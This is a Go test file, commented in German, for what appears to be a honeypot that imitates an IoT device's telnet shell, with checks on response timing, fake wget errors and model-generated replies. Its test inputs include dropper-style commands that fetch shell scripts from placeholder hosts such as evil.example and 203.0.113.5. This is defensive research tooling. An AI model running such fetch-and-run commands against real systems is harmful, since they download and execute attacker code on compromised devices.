package main

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

// mimicTestServer: nachgebauter Hive, der immer dieselbe Shell-Antwort liefert.
func mimicTestServer(t *testing.T, out string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]any{"out": out})
	}))
}

func TestShellDelayRanges(t *testing.T) {
	cases := []struct {
		line   string
		lo, hi time.Duration
	}{
		{"echo hi", time.Millisecond, 9 * time.Millisecond},
		{"ls", 8 * time.Millisecond, 70 * time.Millisecond},
		{"/bin/busybox ps", 8 * time.Millisecond, 70 * time.Millisecond},
		{"foo", 4 * time.Millisecond, 30 * time.Millisecond},
		{"wget http://203.0.113.5/x.sh", 15 * time.Millisecond, 120 * time.Millisecond},        // Adresse: sofort verweigert
		{"wget http://malware.example/x.sh", 1200 * time.Millisecond, 4500 * time.Millisecond}, // Name: der Resolver braucht
		{"cd /tmp; wget http://a.example/x", 1200 * time.Millisecond, 4510 * time.Millisecond},
	}
	for _, c := range cases {
		seen := map[time.Duration]bool{}
		for i := 0; i < 200; i++ {
			d := shellDelayDefault(c.line)
			if d < c.lo || d > c.hi {
				t.Fatalf("%q: %v außerhalb %v..%v", c.line, d, c.lo, c.hi)
			}
			seen[d] = true
		}
		if len(seen) < 50 {
			t.Errorf("%q: Zeiten streuen zu wenig (%d verschiedene)", c.line, len(seen))
		}
	}
	// Obergrenze auch bei langen Ketten
	long := strings.Repeat("wget http://a.example/x; ", 20)
	if d := shellDelayDefault(long); d > 8*time.Second {
		t.Errorf("Kette: %v", d)
	}
}

func TestMimicTargetRanges(t *testing.T) {
	for i := 0; i < 500; i++ {
		if d := mimicTargetDefault("shell"); d < 900*time.Millisecond || d > 2800*time.Millisecond {
			t.Fatalf("shell: %v", d)
		}
		if d := mimicTargetDefault("web"); d < 300*time.Millisecond || d > 1300*time.Millisecond {
			t.Fatalf("web: %v", d)
		}
	}
}

func TestMimicPad(t *testing.T) {
	old := mimicTarget
	defer func() { mimicTarget = old }()
	mimicTarget = func(string) time.Duration { return 120 * time.Millisecond }
	start := time.Now()
	mimicPad("shell", start)
	if el := time.Since(start); el < 110*time.Millisecond {
		t.Errorf("zu früh: %v", el)
	}
	// schon länger her als die Zielzeit: keine zusätzliche Wartezeit
	start = time.Now().Add(-time.Second)
	t0 := time.Now()
	mimicPad("shell", start)
	if el := time.Since(t0); el > 50*time.Millisecond {
		t.Errorf("unnötig gewartet: %v", el)
	}
}

func TestWgetError(t *testing.T) {
	const unreach = "wget: can't connect to remote host: Network is unreachable\r\n"
	conn := func(h, port string) string {
		return "Connecting to " + h + " (" + h + ":" + port + ")\r\nwget: can't connect to remote host (" + h + "): Network is unreachable\r\n"
	}
	cases := []struct{ args, want string }{
		{"http://203.0.113.5/x.sh", conn("203.0.113.5", "80")},
		{"-q -O /tmp/x http://203.0.113.5:8080/a/b", conn("203.0.113.5", "8080")},
		{"-O - http://evil.example/x", "wget: bad address 'evil.example'\r\n"},
		{"203.0.113.9/bins.sh", conn("203.0.113.9", "80")},
		{"ftp://203.0.113.9/x", conn("203.0.113.9", "21")},
		{"", unreach},
		{"https://x.example/y", unreach},
	}
	for _, c := range cases {
		if got := wgetError(strings.Fields(c.args)); got != c.want {
			t.Errorf("wget %s:\n got %q\nwant %q", c.args, got, c.want)
		}
	}
	// ganze Befehlszeile durch die Schein-Shell
	if out := telnetReply(deviceProfile{}, "cam", "wget http://203.0.113.5/x"); !strings.Contains(out, "Connecting to 203.0.113.5") {
		t.Errorf("telnetReply: %q", out)
	}
}

// Modell-Antworten bekommen die Mindestdauer, statische Antworten nicht.
func TestMimicShellMinimumDuration(t *testing.T) {
	old := mimicTarget
	defer func() { mimicTarget = old }()
	mimicTarget = func(string) time.Duration { return 150 * time.Millisecond }
	mimicOffUntil.Store(0)
	srv := mimicTestServer(t, "ok\n")
	defer srv.Close()
	m := testManager()
	m.em.hive = &HiveClient{URL: srv.URL, Token: "tok", Sensor: "test", HTTP: srv.Client()}
	s := &Session{m: m, SrcIP: "203.0.113.7", Service: "telnet"}
	start := time.Now()
	if out := s.mimicShell("cam", "foo"); out != "ok\r\n" {
		t.Fatalf("Antwort: %q", out)
	}
	if el := time.Since(start); el < 140*time.Millisecond {
		t.Errorf("Modell-Antwort zu schnell: %v", el)
	}
	start = time.Now()
	s.mimicShell("cam", "id")
	if el := time.Since(start); el > 100*time.Millisecond {
		t.Errorf("statische Antwort verzögert: %v", el)
	}
}
